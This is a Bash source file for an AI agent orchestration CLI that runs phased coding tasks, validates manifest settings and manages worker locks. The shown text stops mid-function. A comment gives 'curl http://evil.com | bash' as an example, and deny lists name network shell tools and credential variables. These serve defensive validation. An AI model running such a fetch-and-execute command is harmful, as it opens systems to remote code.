#!/usr/bin/env bash
#
# AI Agent - Core Logic
#
# This is the core agent implementation for the doyaken CLI.
# It executes tasks through an 8-phase workflow with self-healing capabilities.
#
# PHASES:
#   0. EXPAND    - Expand brief prompt into full task specification (2min)
#   1. TRIAGE    - Validate task, check dependencies (2min)
#   2. PLAN      - Gap analysis, detailed planning (5min)
#   3. IMPLEMENT - Execute the plan, write code (30min)
#   4. TEST      - Run tests, add coverage (10min)
#   5. DOCS      - Sync documentation (5min)
#   6. REVIEW    - Code review, create follow-ups (10min)
#   7. VERIFY    - Verify task management, commit task files (3min)
#
# FEATURES:
#   - Modular phase-based execution (fresh context per phase)
#   - Phase-specific prompts and timeouts
#   - Automatic retry with exponential backoff
#   - Model fallback (opus -> sonnet on rate limits)
#   - Parallel agent support via lock files
#   - Self-healing and crash recovery
#
set -euo pipefail

# Secure file permissions: owner only (prevents world-readable logs/state)
umask 0077

# ============================================================================
# Path Configuration (supports global installation)
# ============================================================================

# Global installation directory
DOYAKEN_HOME="${DOYAKEN_HOME:-$HOME/.doyaken}"

# Fallback to script location for development
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [ ! -d "$DOYAKEN_HOME/prompts" ]; then
  DOYAKEN_HOME="$(cd "$SCRIPT_DIR/.." && pwd)"
fi

# Source agent abstraction
source "$SCRIPT_DIR/agents.sh"

# Source skills for hooks
source "$SCRIPT_DIR/skills.sh"

# Source configuration library
source "$SCRIPT_DIR/config.sh"

# Source review tracker for periodic reviews
source "$SCRIPT_DIR/review-tracker.sh"

# Project directory (set by CLI or auto-detected)
PROJECT_DIR="${DOYAKEN_PROJECT:-$(pwd)}"

# Detect project data directory (.doyaken/ or .claude/ for legacy)
if [ -n "${DOYAKEN_DIR:-}" ]; then
  # Explicitly set (e.g., by CLI for legacy support)
  DATA_DIR="$DOYAKEN_DIR"
elif [ -d "$PROJECT_DIR/.doyaken" ]; then
  DATA_DIR="$PROJECT_DIR/.doyaken"
elif [ -d "$PROJECT_DIR/.claude" ]; then
  # Legacy support
  DATA_DIR="$PROJECT_DIR/.claude"
else
  echo "Error: No .doyaken/ or .claude/ directory found in $PROJECT_DIR"
  echo "Run 'doyaken init' to initialize this directory"
  exit 1
fi

# Prompts: Check project first, then global (project is source of truth)
# This allows projects to customize phase prompts
get_prompt_file() {
  local prompt_name="$1"

  # Check project-specific prompts first
  if [ -f "$DATA_DIR/prompts/$prompt_name" ]; then
    echo "$DATA_DIR/prompts/$prompt_name"
    return 0
  fi

  # Fall back to global prompts
  if [ -f "$DOYAKEN_HOME/prompts/$prompt_name" ]; then
    echo "$DOYAKEN_HOME/prompts/$prompt_name"
    return 0
  fi

  # Legacy fallback
  if [ -f "$DOYAKEN_HOME/agent/prompts/$prompt_name" ]; then
    echo "$DOYAKEN_HOME/agent/prompts/$prompt_name"
    return 0
  fi

  return 1
}

# For backward compatibility, set PROMPTS_DIR to global location
PROMPTS_DIR="${PROMPTS_DIR:-$DOYAKEN_HOME/prompts}"
if [ ! -d "$PROMPTS_DIR" ]; then
  PROMPTS_DIR="$DOYAKEN_HOME/agent/prompts"
fi

# Process {{include:path}} directives in prompts
# Allows modules to be referenced and composed into phase prompts
process_includes() {
  local content="$1"
  local max_depth="${2:-5}"  # Prevent infinite recursion

  if [ "$max_depth" -le 0 ]; then
    echo "$content"
    return 0
  fi

  # Find all {{include:path}} patterns
  local result="$content"
  local include_pattern='\{\{include:([^}]+)\}\}'

  while [[ "$result" =~ $include_pattern ]]; do
    local full_match="${BASH_REMATCH[0]}"
    local include_path="${BASH_REMATCH[1]}"

    # Find the include file (project first, then global)
    local include_file=""
    if [ -f "$DATA_DIR/prompts/$include_path" ]; then
      include_file="$DATA_DIR/prompts/$include_path"
    elif [ -f "$DOYAKEN_HOME/prompts/$include_path" ]; then
      include_file="$DOYAKEN_HOME/prompts/$include_path"
    fi

    if [ -n "$include_file" ] && [ -f "$include_file" ]; then
      # Read include content and process nested includes
      local include_content
      include_content=$(cat "$include_file")
      include_content=$(process_includes "$include_content" $((max_depth - 1)))

      # Replace the include directive with content
      result="${result//$full_match/$include_content}"
    else
      # Leave the directive if file not found (will show as error in prompt)
      log_warn "Include file not found: $include_path"
      break
    fi
  done

  echo "$result"
}

SCRIPTS_DIR="${SCRIPTS_DIR:-$DOYAKEN_HOME/lib}"

# ============================================================================
# Environment Variable Security (for manifest loading)
# ============================================================================

# Blocked environment variable prefixes (security-sensitive)
BLOCKED_ENV_PREFIXES=(
  "LD_"           # Library injection (Linux)
  "DYLD_"         # Library injection (macOS)
  "SSH_"          # SSH credentials
  "GPG_"          # GPG credentials
  "AWS_"          # AWS credentials
  "GOOGLE_"       # Google Cloud credentials
  "AZURE_"        # Azure credentials
  "LC_"           # Locale (can affect parsing)
)

# Blocked environment variables (exact match, security-sensitive)
BLOCKED_ENV_VARS=(
  # System paths
  "PATH" "MANPATH" "INFOPATH"
  # Library paths
  "LIBPATH" "SHLIB_PATH"
  # Interpreter paths
  "PYTHONPATH" "PYTHONHOME" "NODE_PATH" "NODE_OPTIONS"
  "RUBYLIB" "RUBYOPT" "PERL5LIB" "PERL5OPT"
  "CLASSPATH" "GOPATH" "GOROOT"
  # Shell injection
  "IFS" "PS1" "PS2" "PS4" "PROMPT_COMMAND" "BASH_ENV" "ENV" "CDPATH"
  # System identity
  "HOME" "USER" "SHELL" "TERM" "LOGNAME" "MAIL" "LANG"
  # Credential access
  "GNUPGHOME"
  # Network proxies
  "http_proxy" "https_proxy" "HTTP_PROXY" "HTTPS_PROXY"
  "no_proxy" "NO_PROXY" "ftp_proxy" "FTP_PROXY"
  # Other dangerous
  "EDITOR" "VISUAL" "PAGER" "BROWSER"
)

# Safe environment variable prefixes (allowlist)
SAFE_ENV_PREFIXES=(
  "DOYAKEN_"      # Our own variables
  "QUALITY_"      # Quality gate variables
  "CI_"           # CI/CD variables
  "DEBUG_"        # Debug flags
)

# ============================================================================
# Quality Command Security (for manifest loading)
# ============================================================================

# Safe command prefixes for quality gate commands (allowlist)
# Commands must start with one of these to be considered safe
SAFE_QUALITY_COMMANDS=(
  # Node.js ecosystem
  "npm" "yarn" "pnpm" "npx" "bun"
  # Rust
  "cargo"
  # Go
  "go"
  # Build tools
  "make"
  # Python testing/linting
  "pytest" "python" "ruff" "mypy" "black" "flake8" "pylint"
  # JavaScript/TypeScript linting
  "jest" "eslint" "tsc" "prettier" "vitest" "mocha"
  # Shell
  "shellcheck" "bats"
  # Other languages
  "node" "deno" "php" "composer" "ruby" "rake" "bundle"
  "gradle" "mvn" "dotnet"
)

# Dangerous patterns that indicate potential command injection
# These patterns in a quality command trigger a warning
DANGEROUS_COMMAND_PATTERNS=(
  '|'           # Pipe (command chaining)
  '$('          # Command substitution
  '`'           # Backtick command substitution
  '&&'          # Command chaining (AND)
  '||'          # Command chaining (OR) - can be legitimate for fallback
  ';'           # Command separator
  '>'           # Output redirection
  '>>'          # Append redirection
  '<'           # Input redirection
  'curl '       # Network access
  'wget '       # Network access
  'nc '         # Netcat
  'bash -c'     # Shell execution
  'sh -c'       # Shell execution
  'eval '       # Eval execution
  '/dev/'       # Device access
  '~/'          # Home directory access
  '../'         # Parent directory traversal
)

# Validate if an environment variable name is safe to export
# Returns 0 if safe, 1 if blocked
is_safe_env_var() {
  local var_name="$1"

  # Empty name is not safe
  [ -z "$var_name" ] && return 1

  # Convert to uppercase for comparison
  local var_upper
  var_upper=$(echo "$var_name" | tr '[:lower:]' '[:upper:]')

  # Check safe prefixes first (fast path for common cases)
  for prefix in "${SAFE_ENV_PREFIXES[@]}"; do
    if [[ "$var_upper" == "${prefix}"* ]]; then
      return 0
    fi
  done

  # Check blocked prefixes
  for prefix in "${BLOCKED_ENV_PREFIXES[@]}"; do
    if [[ "$var_upper" == "${prefix}"* ]]; then
      return 1
    fi
  done

  # Check blocked exact matches (case-insensitive for proxies)
  for blocked in "${BLOCKED_ENV_VARS[@]}"; do
    local blocked_upper
    blocked_upper=$(echo "$blocked" | tr '[:lower:]' '[:upper:]')
    if [ "$var_upper" = "$blocked_upper" ]; then
      return 1
    fi
  done

  # Validate pattern: must be uppercase alphanumeric with underscores
  # Must start with a letter
  if ! [[ "$var_name" =~ ^[A-Z][A-Z0-9_]*$ ]]; then
    return 1
  fi

  return 0
}

# Validate a quality gate command for safety
# Returns:
#   0 = safe (command is in allowlist, no dangerous patterns)
#   1 = suspicious (unknown command or has dangerous patterns) - warn only
#   2 = dangerous (blocked in strict mode) - block if DOYAKEN_STRICT_QUALITY=1
#
# Usage: validate_quality_command "npm test"
#        validate_quality_command "curl http://evil.com | bash"
validate_quality_command() {
  local cmd="$1"
  local cmd_name="${2:-quality command}"

  # Empty commands are safe (noop)
  [ -z "$cmd" ] && return 0

  # Trim leading/trailing whitespace
  cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  [ -z "$cmd" ] && return 0

  # Extract the base command (first word, strip any path)
  local base_cmd
  base_cmd=$(echo "$cmd" | awk '{print $1}')
  base_cmd=$(basename "$base_cmd")

  # Check for dangerous patterns first (highest priority)
  local has_dangerous=0
  for pattern in "${DANGEROUS_COMMAND_PATTERNS[@]}"; do
    if [[ "$cmd" == *"$pattern"* ]]; then
      has_dangerous=1
      break
    fi
  done

  # Check if base command is in allowlist
  local is_allowed=0
  for safe_cmd in "${SAFE_QUALITY_COMMANDS[@]}"; do
    if [ "$base_cmd" = "$safe_cmd" ]; then
      is_allowed=1
      break
    fi
  done

  # Determine result based on checks
  if [ "$has_dangerous" -eq 1 ]; then
    # Dangerous pattern detected - return 2 (can be blocked in strict mode)
    return 2
  elif [ "$is_allowed" -eq 0 ]; then
    # Unknown command - return 1 (warn only)
    return 1
  fi

  # Safe command
  return 0
}

# ============================================================================
# First-Run Warning
# ============================================================================

# Check and display first-run warning about autonomous mode
# Skip if: CI=true, non-interactive terminal, or already acknowledged
check_first_run_warning() {
  local ack_file="$DOYAKEN_HOME/.acknowledged"

  # Skip in CI environments
  if [ "${CI:-false}" = "true" ]; then
    return 0
  fi

  # Skip in non-interactive terminals
  if ! [ -t 0 ]; then
    return 0
  fi

  # Skip if already acknowledged
  if [ -f "$ack_file" ]; then
    return 0
  fi

  # Display warning
  echo ""
  echo "╔════════════════════════════════════════════════════════════════════╗"
  echo "║                     ⚠  SECURITY NOTICE  ⚠                         ║"
  echo "╠════════════════════════════════════════════════════════════════════╣"
  echo "║  Doyaken runs AI agents in FULLY AUTONOMOUS MODE by default.      ║"
  echo "║                                                                    ║"
  echo "║  Agents can:                                                       ║"
  echo "║    • Execute arbitrary code without approval                       ║"
  echo "║    • Modify any files in your project                              ║"
  echo "║    • Access environment variables                                  ║"
  echo "║    • Make network requests                                         ║"
  echo "║                                                                    ║"
  echo "║  Use --safe-mode to disable bypass flags and require confirmation. ║"
  echo "║  See SECURITY.md for the full trust model.                         ║"
  echo "╚════════════════════════════════════════════════════════════════════╝"
  echo ""

  # Prompt for acknowledgment
  read -r -p "Type 'yes' to acknowledge and continue: " response

  if [ "$response" = "yes" ]; then
    # Create acknowledgment file
    mkdir -p "$(dirname "$ack_file")"
    echo "acknowledged=$(date -Iseconds 2>/dev/null || date)" > "$ack_file"
    echo ""
    echo "Acknowledgment recorded. This warning will not appear again."
    echo ""
    return 0
  else
    echo ""
    echo "Autonomous mode not acknowledged. Exiting."
    echo "Run with --safe-mode for interactive confirmation, or type 'yes' to continue."
    exit 1
  fi
}

# ============================================================================
# Manifest Loading
# ============================================================================

MANIFEST_FILE="$DATA_DIR/manifest.yaml"

# Global cache for manifest JSON (set by _load_manifest_json)
MANIFEST_JSON=""

# Load manifest as JSON for efficient parsing (single yq call)
# Sets MANIFEST_JSON global variable
_load_manifest_json() {
  if [ -n "$MANIFEST_JSON" ]; then
    return 0  # Already cached
  fi
  MANIFEST_JSON=$(yq -o=json '.' "$MANIFEST_FILE" 2>/dev/null) || MANIFEST_JSON="{}"
}

# Get value from cached manifest JSON
# Usage: _jq_get '.agent.name' -> returns value or empty string
_jq_get() {
  echo "$MANIFEST_JSON" | jq -r "$1 // \"\"" 2>/dev/null || echo ""
}

# Load manifest settings (if yq is available)
load_manifest() {
  if [ ! -f "$MANIFEST_FILE" ]; then
    return 0
  fi

  if ! command -v yq &>/dev/null; then
    return 0
  fi

  # Check if jq is available for optimized loading
  local use_json_cache=0
  if command -v jq &>/dev/null; then
    use_json_cache=1
    _load_manifest_json
  fi

  # Load agent settings from manifest (only if not set via CLI/env)
  local manifest_agent manifest_model
  if [ "$use_json_cache" = "1" ]; then
    manifest_agent=$(_jq_get '.agent.name')
    manifest_model=$(_jq_get '.agent.model')
  else
    manifest_agent=$(yq -e '.agent.name // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    manifest_model=$(yq -e '.agent.model // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
  fi

  # Only apply manifest values if not already set by CLI
  if [ -z "${DOYAKEN_AGENT_FROM_CLI:-}" ] && [ -n "$manifest_agent" ]; then
    export DOYAKEN_AGENT="$manifest_agent"
  fi
  if [ -z "${DOYAKEN_MODEL_FROM_CLI:-}" ] && [ -n "$manifest_model" ]; then
    export DOYAKEN_MODEL="$manifest_model"
  fi

  # Load max retries
  local manifest_retries
  if [ "$use_json_cache" = "1" ]; then
    manifest_retries=$(_jq_get '.agent.max_retries')
  else
    manifest_retries=$(yq -e '.agent.max_retries // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
  fi
  if [ -n "$manifest_retries" ] && [ -z "${AGENT_MAX_RETRIES_FROM_CLI:-}" ]; then
    export AGENT_MAX_RETRIES="$manifest_retries"
  fi

  # Load quality gate commands (with security validation)
  local test_cmd lint_cmd format_cmd build_cmd
  if [ "$use_json_cache" = "1" ]; then
    test_cmd=$(_jq_get '.quality.test_command')
    lint_cmd=$(_jq_get '.quality.lint_command')
    format_cmd=$(_jq_get '.quality.format_command')
    build_cmd=$(_jq_get '.quality.build_command')
  else
    test_cmd=$(yq -e '.quality.test_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    lint_cmd=$(yq -e '.quality.lint_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    format_cmd=$(yq -e '.quality.format_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    build_cmd=$(yq -e '.quality.build_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
  fi

  # Validate each quality command
  local validation_result
  local quality_cmds=("test_command:$test_cmd" "lint_command:$lint_cmd" "format_command:$format_cmd" "build_command:$build_cmd")
  for cmd_entry in "${quality_cmds[@]}"; do
    local cmd_name="${cmd_entry%%:*}"
    local cmd_value="${cmd_entry#*:}"
    [ -z "$cmd_value" ] && continue

    validation_result=0
    validate_quality_command "$cmd_value" "$cmd_name" || validation_result=$?

    case $validation_result in
      1)
        # Unknown command - warn only
        log_warn "Suspicious quality.$cmd_name: '$cmd_value' (unknown command prefix)"
        ;;
      2)
        # Dangerous pattern detected
        log_warn "Dangerous quality.$cmd_name: '$cmd_value' (contains dangerous pattern)"
        if [ "${DOYAKEN_STRICT_QUALITY:-0}" = "1" ]; then
          log_warn "Blocking quality.$cmd_name due to DOYAKEN_STRICT_QUALITY=1"
          # Clear the dangerous command
          case "$cmd_name" in
            test_command) test_cmd="" ;;
            lint_command) lint_cmd="" ;;
            format_command) format_cmd="" ;;
            build_command) build_cmd="" ;;
          esac
        fi
        ;;
    esac
  done

  export QUALITY_TEST_CMD="$test_cmd"
  export QUALITY_LINT_CMD="$lint_cmd"
  export QUALITY_FORMAT_CMD="$format_cmd"
  export QUALITY_BUILD_CMD="$build_cmd"

  # Load custom environment variables from manifest (with security validation)
  if [ "$use_json_cache" = "1" ]; then
    # Optimized: extract all env vars as key=value pairs in single jq call
    local env_pairs
    env_pairs=$(echo "$MANIFEST_JSON" | jq -r '.env // {} | to_entries[] | "\(.key)=\(.value)"' 2>/dev/null) || env_pairs=""
    while IFS='=' read -r key value; do
      [ -z "$key" ] && continue
      # Validate env var name before exporting
      if ! is_safe_env_var "$key"; then
        log_warn "Blocked unsafe env var from manifest: $key"
        continue
      fi
      if [ -n "$value" ]; then
        export "$key=$value"
      fi
    done <<< "$env_pairs"
  else
    local env_keys
    env_keys=$(yq -e '.env | keys | .[]' "$MANIFEST_FILE" 2>/dev/null || echo "")
    if [ -n "$env_keys" ]; then
      while IFS= read -r key; do
        [ -z "$key" ] && continue
        # Validate env var name before exporting
        if ! is_safe_env_var "$key"; then
          log_warn "Blocked unsafe env var from manifest: $key"
          continue
        fi
        local value
        value=$(yq -e ".env.${key}" "$MANIFEST_FILE" 2>/dev/null || echo "")
        if [ -n "$value" ]; then
          export "$key=$value"
        fi
      done <<< "$env_keys"
    fi
  fi

  # Load skill hooks for all phases
  local phases="expand triage plan implement test docs review verify"
  local hook_types="before after"
  if [ "$use_json_cache" = "1" ]; then
    # Optimized: extract all hooks in single jq call, iterate in bash
    local hooks_json
    hooks_json=$(echo "$MANIFEST_JSON" | jq -c '.skills.hooks // {}' 2>/dev/null) || hooks_json="{}"
    for phase in $phases; do
      for hook_type in $hook_types; do
        local hook_type_upper phase_upper
        hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
        phase_upper=$(echo "$phase" | tr '[:lower:]' '[:upper:]')
        local var_name="HOOKS_${hook_type_upper}_${phase_upper}"
        local hook_key="${hook_type}-${phase}"
        local hook_value
        hook_value=$(echo "$hooks_json" | jq -r ".\"$hook_key\" // [] | .[]" 2>/dev/null | tr '\n' ' ') || hook_value=""
        export "$var_name=$hook_value"
      done
    done
  else
    for phase in $phases; do
      for hook_type in $hook_types; do
        local hook_type_upper phase_upper
        hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
        phase_upper=$(echo "$phase" | tr '[:lower:]' '[:upper:]')
        local var_name="HOOKS_${hook_type_upper}_${phase_upper}"
        local hook_value
        hook_value=$(yq -e ".skills.hooks.${hook_type}-${phase} // [] | .[]" "$MANIFEST_FILE" 2>/dev/null | tr '\n' ' ' || echo "")
        export "$var_name=$hook_value"
      done
    done
  fi

  # Clear the cache after loading to avoid stale data on next call
  MANIFEST_JSON=""
}

# Run skill hooks for a phase
run_skill_hooks() {
  local hook_type="$1"  # "before" or "after"
  local phase_name="$2" # "EXPAND", "TRIAGE", etc.

  local phase_lower
  phase_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
  local hook_type_upper
  hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
  local hooks_var="HOOKS_${hook_type_upper}_${phase_name}"
  # Use indirect expansion instead of eval for safety
  local hooks="${!hooks_var:-}"

  [ -z "$hooks" ] && return 0

  log_info "Running $hook_type-$phase_lower hooks..."
  for skill_name in $hooks; do
    [ -z "$skill_name" ] && continue
    log_info "  Running skill: $skill_name"
    if ! run_skill "$skill_name" 2>&1 | head -20; then
      log_warn "  Skill $skill_name failed (continuing anyway)"
    fi
  done
}

# Load manifest early
load_manifest

# Load all configuration from global and project config files
# This handles: timeouts, skip_phases, agent settings, output settings
load_all_config "$MANIFEST_FILE"

# Project-specific directories
TASKS_DIR="${TASKS_DIR:-$DATA_DIR/tasks}"
LOGS_DIR="${LOGS_DIR:-$DATA_DIR/logs/claude-loop}"
STATE_DIR="${STATE_DIR:-$DATA_DIR/state}"
LOCKS_DIR="${LOCKS_DIR:-$DATA_DIR/locks}"

# Detect operating manual (AGENT.md or CLAUDE.md for legacy)
if [ -f "$PROJECT_DIR/AGENT.md" ]; then
  AGENT_MD="$PROJECT_DIR/AGENT.md"
elif [ -f "$PROJECT_DIR/CLAUDE.md" ]; then
  AGENT_MD="$PROJECT_DIR/CLAUDE.md"
else
  AGENT_MD=""
fi

# ============================================================================
# Configuration Defaults
# ============================================================================

NUM_TASKS="${1:-5}"

# Agent configuration
DOYAKEN_AGENT="${DOYAKEN_AGENT:-claude}"
DOYAKEN_MODEL="${DOYAKEN_MODEL:-$(agent_default_model "$DOYAKEN_AGENT")}"

# Legacy support: CLAUDE_MODEL overrides DOYAKEN_MODEL for claude agent
if [ "$DOYAKEN_AGENT" = "claude" ] && [ -n "${CLAUDE_MODEL:-}" ]; then
  DOYAKEN_MODEL="$CLAUDE_MODEL"
fi

AGENT_DRY_RUN="${AGENT_DRY_RUN:-0}"
AGENT_VERBOSE="${AGENT_VERBOSE:-0}"
AGENT_QUIET="${AGENT_QUIET:-0}"
AGENT_PROGRESS="${AGENT_PROGRESS:-1}"
AGENT_MAX_RETRIES="${AGENT_MAX_RETRIES:-2}"
AGENT_RETRY_DELAY="${AGENT_RETRY_DELAY:-5}"
AGENT_NO_RESUME="${AGENT_NO_RESUME:-0}"
AGENT_LOCK_TIMEOUT="${AGENT_LOCK_TIMEOUT:-10800}"
AGENT_HEARTBEAT="${AGENT_HEARTBEAT:-3600}"
PHASE_MONITOR_INTERVAL="${PHASE_MONITOR_INTERVAL:-30}"
PHASE_STALL_THRESHOLD="${PHASE_STALL_THRESHOLD:-180}"
AGENT_NO_FALLBACK="${AGENT_NO_FALLBACK:-0}"
AGENT_NO_PROMPT="${AGENT_NO_PROMPT:-0}"

# Phase skip flags and timeouts are loaded from config files via load_all_config()
# They can still be overridden via environment variables
# See: config/global.yaml and .doyaken/manifest.yaml for configuration

# Ensure defaults if not loaded from config (fallback for edge cases)
SKIP_EXPAND="${SKIP_EXPAND:-0}"
SKIP_TRIAGE="${SKIP_TRIAGE:-0}"
SKIP_PLAN="${SKIP_PLAN:-0}"
SKIP_IMPLEMENT="${SKIP_IMPLEMENT:-0}"
SKIP_TEST="${SKIP_TEST:-0}"
SKIP_DOCS="${SKIP_DOCS:-0}"
SKIP_REVIEW="${SKIP_REVIEW:-0}"
SKIP_VERIFY="${SKIP_VERIFY:-0}"

TIMEOUT_EXPAND="${TIMEOUT_EXPAND:-900}"
TIMEOUT_TRIAGE="${TIMEOUT_TRIAGE:-540}"
TIMEOUT_PLAN="${TIMEOUT_PLAN:-900}"
TIMEOUT_IMPLEMENT="${TIMEOUT_IMPLEMENT:-5400}"
TIMEOUT_TEST="${TIMEOUT_TEST:-1800}"
TIMEOUT_DOCS="${TIMEOUT_DOCS:-900}"
TIMEOUT_REVIEW="${TIMEOUT_REVIEW:-1800}"
TIMEOUT_VERIFY="${TIMEOUT_VERIFY:-900}"

# Phase definitions: name|prompt_file|timeout|skip_var
PHASES=(
  "EXPAND|phases/0-expand.md|$TIMEOUT_EXPAND|$SKIP_EXPAND"
  "TRIAGE|phases/1-triage.md|$TIMEOUT_TRIAGE|$SKIP_TRIAGE"
  "PLAN|phases/2-plan.md|$TIMEOUT_PLAN|$SKIP_PLAN"
  "IMPLEMENT|phases/3-implement.md|$TIMEOUT_IMPLEMENT|$SKIP_IMPLEMENT"
  "TEST|phases/4-test.md|$TIMEOUT_TEST|$SKIP_TEST"
  "DOCS|phases/5-docs.md|$TIMEOUT_DOCS|$SKIP_DOCS"
  "REVIEW|phases/6-review.md|$TIMEOUT_REVIEW|$SKIP_REVIEW"
  "VERIFY|phases/7-verify.md|$TIMEOUT_VERIFY|$SKIP_VERIFY"
)

# Model state (for fallback)
CURRENT_AGENT="$DOYAKEN_AGENT"
CURRENT_MODEL="$DOYAKEN_MODEL"
MODEL_FALLBACK_TRIGGERED=0

# Pass-through arguments for the underlying agent CLI
# Set via DOYAKEN_PASSTHROUGH_ARGS environment variable (space-separated)
# or via -- separator on command line
if [ -n "${DOYAKEN_PASSTHROUGH_ARGS:-}" ]; then
  # Convert space-separated string to array
  read -r -a DOYAKEN_PASSTHROUGH_ARGS <<< "$DOYAKEN_PASSTHROUGH_ARGS"
else
  DOYAKEN_PASSTHROUGH_ARGS=()
fi

# Generate unique agent ID with nicer default (atomic to prevent race conditions)
if [ -z "${AGENT_NAME:-}" ]; then
  # Ensure locks directory exists with secure permissions
  mkdir -p "$LOCKS_DIR" 2>/dev/null || true
  chmod 700 "$LOCKS_DIR" 2>/dev/null || true

  # Auto-generate worker name using atomic mkdir to prevent race conditions
  WORKER_NUM=1
  while true; do
    WORKER_LOCK_DIR="$LOCKS_DIR/.worker-${WORKER_NUM}.active"
    if mkdir "$WORKER_LOCK_DIR" 2>/dev/null; then
      echo "$$" > "$WORKER_LOCK_DIR/pid"
      break
    fi
    if [ -f "$WORKER_LOCK_DIR/pid" ]; then
      OLD_PID=$(cat "$WORKER_LOCK_DIR/pid" 2>/dev/null || echo "0")
      if [ "$OLD_PID" != "0" ] && ! kill -0 "$OLD_PID" 2>/dev/null; then
        rm -rf "$WORKER_LOCK_DIR" 2>/dev/null || true
        if mkdir "$WORKER_LOCK_DIR" 2>/dev/null; then
          echo "$$" > "$WORKER_LOCK_DIR/pid"
          break
        fi
      fi
    fi
    ((WORKER_NUM++))
    if [ "$WORKER_NUM" -gt 100 ]; then
      echo "ERROR: Could not find available worker number (max 100)" >&2
      exit 1
    fi
  done
  AGENT_NAME="worker-${WORKER_NUM}"
fi
AGENT_ID="${AGENT_NAME}"

# Track locks held by this agent
HELD_LOCKS=()

# Track if this is an interrupt (Ctrl+C) vs normal exit
INTERRUPTED=0

# Source centralized logging for colors
source "$SCRIPT_DIR/logging.sh"

# Additional color for core
MAGENTA='\033[0;35m'

# ============================================================================
# Logging (agent-specific with AGENT_ID prefix)
# ============================================================================

RUN_TIMESTAMP=$(date '+%Y%m%d-%H%M%S')
RUN_LOG_DIR="$LOGS_DIR/$RUN_TIMESTAMP-$AGENT_ID"

# Core uses AGENT_ID in prefix for multi-agent distinction
log_info() {
  echo -e "${BLUE}[$AGENT_ID]${NC} $1"
}

log_success() {
  echo -e "${GREEN}[$AGENT_ID OK]${NC} $1"
}

log_warn() {
  echo -e "${YELLOW}[$AGENT_ID WARN]${NC} $1"
}

log_error() {
  echo -e "${RED}[$AGENT_ID ERROR]${NC} $1"
}

log_step() {
  echo -e "${CYAN}[$AGENT_ID STEP]${NC} $1"
}

log_heal() {
  echo -e "${MAGENTA}[$AGENT_ID HEAL]${NC} $1"
}

log_lock() {
  echo -e "${YELLOW}[$AGENT_ID LOCK]${NC} $1"
}

log_monitor() {
  echo -e "${DIM}[$AGENT_ID MONITOR]${NC} $1"
}

log_monitor_warn() {
  echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} $1"
}

log_model() {
  echo -e "${MAGENTA}[$AGENT_ID MODEL]${NC} $1"
}

log_phase() {
  echo -e "${BOLD}${CYAN}[$AGENT_ID PHASE]${NC} $1"
}

log_header() {
  echo ""
  echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD} $1${NC}"
  echo -e "${BOLD} Agent: $AGENT_ID${NC}"
  echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
}

# ============================================================================
# Progress Filter (for AGENT_PROGRESS mode)
# ============================================================================

progress_filter() {
  trap "exit 130" INT TERM
  local phase_name="$1"
  local last_tool=""
  local line_count=0
  local start_time
  start_time=$(date +%s)

  show_status() {
    local elapsed=$(( $(date +%s) - start_time ))
    local mins=$(( elapsed / 60 ))
    local secs=$(( elapsed % 60 ))
    printf "${CYAN}[%s]${NC} ${BOLD}%s${NC} %02d:%02d │ %s\n" "$AGENT_ID" "$phase_name" "$mins" "$secs" "$1"
  }

  while IFS= read -r line; do
    ((line_count++))

    if command -v jq &>/dev/null; then
      local msg_type tool_name content
      msg_type=$(echo "$line" | jq -r '.type // empty' 2>/dev/null)

      case "$msg_type" in
        "assistant")
          content=$(echo "$line" | jq -r '.message.content[0].text // empty' 2>/dev/null | head -c 160)
          if [ -n "$content" ]; then
            show_status "💭 ${content}..."
          fi
          ;;
        "content_block_start")
          local block_type
          block_type=$(echo "$line" | jq -r '.content_block.type // empty' 2>/dev/null)
          if [ "$block_type" = "tool_use" ]; then
            tool_name=$(echo "$line" | jq -r '.content_block.name // empty' 2>/dev/null)
            if [ -n "$tool_name" ] && [ "$tool_name" != "$last_tool" ]; then
              last_tool="$tool_name"
              show_status "🔧 $tool_name"
            fi
          fi
          ;;
        "result")
          local subtype cost_usd
          subtype=$(echo "$line" | jq -r '.subtype // empty' 2>/dev/null)
          cost_usd=$(echo "$line" | jq -r '.cost_usd // empty' 2>/dev/null)
          if [ "$subtype" = "success" ]; then
            show_status "✓ Done"
          elif [ -n "$cost_usd" ]; then
            show_status "💰 \$$cost_usd"
          fi
          ;;
        *)
          if [ $((line_count % 10)) -eq 0 ]; then
            show_status "⋯ working"
          fi
          ;;
      esac
    else
      if echo "$line" | grep -q '"tool_use"'; then
        local tool
        tool=$(echo "$line" | grep -oE '"name":"[^"]+"' | head -1 | cut -d'"' -f4)
        if [ -n "$tool" ] && [ "$tool" != "$last_tool" ]; then
          last_tool="$tool"
          show_status "🔧 $tool"
        fi
      elif echo "$line" | grep -q '"result"'; then
        show_status "✓ Done"
      elif [ $((line_count % 10)) -eq 0 ]; then
        show_status "⋯ working"
      fi
    fi
  done
}

# ============================================================================
# Lock Management (Parallel Agent Support)
# ============================================================================

init_locks() {
  mkdir -p "$LOCKS_DIR"
  chmod 700 "$LOCKS_DIR"
}

get_task_id_from_file() {
  local file="$1"
  basename "$file" .md
}

get_lock_file() {
  local task_id="$1"
  echo "$LOCKS_DIR/${task_id}.lock"
}

is_lock_stale() {
  local lock_file="$1"

  if [ ! -f "$lock_file" ]; then
    return 0
  fi

  local locked_at pid
  locked_at=$(grep "^LOCKED_AT=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "0")
  pid=$(grep "^PID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "0")

  if [ -n "$pid" ] && [ "$pid" != "0" ]; then
    if ! kill -0 "$pid" 2>/dev/null; then
      log_heal "Lock PID $pid is not running - lock is stale"
